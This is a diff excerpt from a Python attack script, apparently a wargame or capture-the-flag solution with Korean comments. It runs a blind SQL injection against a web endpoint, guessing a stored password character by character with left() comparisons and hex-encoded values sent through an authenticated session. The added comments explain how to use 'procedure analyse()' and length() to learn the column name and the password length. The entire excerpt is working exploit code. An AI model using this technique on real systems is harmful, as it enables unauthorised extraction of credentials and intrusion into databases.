@@ -8,6 +8,8 @@ session=requests.Session()
 password="0x66"
 passwd="f"
 
+#score = 1 limit x,1 procedure analyse() x번째 속성값을 가져온다.
+#length(p4ssw0rd_1123581321) 로 길이를 알아냄. 알아낼 수 없다면 일정값 이상으로 지정해두고 하면됨. 50자이상의 비밀번호는 거의 없는 것.
 for i in range(2,32): #원래는 1 부터 길이+1 까지
     for j in range(33, 127): #hex변환할 글자 33 = !, 126 = ~(전까지) format(j,'x')
         payload=session.get(url+"left(p4ssw0rd_1123581321,"+str(i)+")="+password+format(j,'x'),cookies=cookie) #왼쪽부터 몇글자에 비밀번호 체크 한자씩 추가해가며 검사
